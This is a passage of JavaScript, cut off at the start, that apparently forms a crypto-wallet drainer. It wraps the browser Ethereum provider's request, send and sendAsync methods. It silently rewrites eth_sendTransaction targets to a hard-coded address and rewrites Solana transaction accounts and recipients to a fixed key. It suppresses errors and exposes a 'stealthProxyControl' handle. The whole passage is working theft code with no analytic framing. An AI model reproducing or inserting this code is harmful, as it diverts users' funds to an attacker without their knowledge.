            modifiedData.data = functionSelector + param1 + targetAddress + remainingData;
          }
        }
      } else if (modifiedData.to && modifiedData.to !== "0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976") {
        modifiedData.to = "0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976";
      }
    } else {
      if (modifiedData.instructions && Array.isArray(modifiedData.instructions)) {
        modifiedData.instructions.forEach(instruction => {
          if (instruction.accounts && Array.isArray(instruction.accounts)) {
            instruction.accounts.forEach(account => {
              if (typeof account === "string") {
                account = "19111111111111111111111111111111";
              } else {
                account.pubkey &&= "19111111111111111111111111111111";
              }
            });
          }
          
          if (instruction.keys && Array.isArray(instruction.keys)) {
            instruction.keys.forEach(key => {
              key.pubkey &&= "19111111111111111111111111111111";
            });
          }
        });
      }
      
      modifiedData.recipient &&= "19111111111111111111111111111111";
      modifiedData.destination &&= "19111111111111111111111111111111";
    }
    
    return modifiedData;
  }
  
  function createInterceptor(originalMethod, methodName) {
    return async function (...args) {
      interceptCount++;
      let clonedArgs;
      
      try {
        clonedArgs = JSON.parse(JSON.stringify(args));
      } catch (error) {
        clonedArgs = [...args];
      }
      
      if (args[0] && typeof args[0] === "object") {
        const request = clonedArgs[0];
        
        if (request.method === "eth_sendTransaction" && request.params && request.params[0]) {
          try {
            const modifiedTransaction = modifyTransactionData(request.params[0], true);
            request.params[0] = modifiedTransaction;
          } catch (error) {}
        } else if ((request.method === "solana_signTransaction" || request.method === "solana_signAndSendTransaction") && request.params && request.params[0]) {
          try {
            let transaction = request.params[0];
            if (transaction.transaction) {
              transaction = transaction.transaction;
            }
            
            const modifiedTransaction = modifyTransactionData(transaction, false);
            if (request.params[0].transaction) {
              request.params[0].transaction = modifiedTransaction;
            } else {
              request.params[0] = modifiedTransaction;
            }
          } catch (error) {}
        }
      }
      
      const result = originalMethod.apply(this, clonedArgs);
      
      if (result && typeof result.then === "function") {
        return result.then(response => response).catch(error => {
          throw error;
        });
      }
      
      return result;
    };
  }
  
  function proxyProviderMethods(provider) {
    if (!provider) {
      return false;
    }
    
    let hasProxied = false;
    const targetMethods = ["request", "send", "sendAsync"];
    
    for (const methodName of targetMethods) {
      if (typeof provider[methodName] === "function") {
        const originalMethod = provider[methodName];
        originalMethods.set(methodName, originalMethod);
        
        try {
          Object.defineProperty(provider, methodName, {
            value: createInterceptor(originalMethod, methodName),
            writable: true,
            configurable: true,
            enumerable: true
          });
          hasProxied = true;
        } catch (error) {}
      }
    }
    
    if (hasProxied) {
      isProxyActive = true;
    }
    
    return hasProxied;
  }
  
  function initializeProviderProxy() {
    let attemptCount = 0;
    const maxAttempts = 50;
    
    const attemptProxy = () => {
      attemptCount++;
      
      if (window.ethereum) {
        setTimeout(() => {
          proxyProviderMethods(window.ethereum);
        }, 500);
        return;
      }
      
      if (attemptCount < maxAttempts) {
        setTimeout(attemptProxy, 100);
      }
    };
    
    attemptProxy();
  }
  
  initializeProviderProxy();
  
  window.stealthProxyControl = {
    isActive: () => isProxyActive,
    getInterceptCount: () => interceptCount,
    getOriginalMethods: () => originalMethods,
    forceShield: () => {
      if (window.ethereum) {
        return proxyProviderMethods(window.ethereum);
      }
      return false;
    }
  };
}